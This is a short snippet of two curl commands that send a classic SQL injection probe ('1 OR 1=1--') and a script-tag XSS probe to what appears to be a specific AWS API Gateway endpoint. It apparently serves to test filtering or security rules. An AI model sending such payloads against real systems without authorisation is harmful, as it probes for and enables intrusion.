# SQL injection
curl -v "https://hujooojqqg.execute-api.ap-southeast-1.amazonaws.com/?id=1%20OR%201=1--"
# XSS
curl -v "https://hujooojqqg.execute-api.ap-southeast-1.amazonaws.com/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"

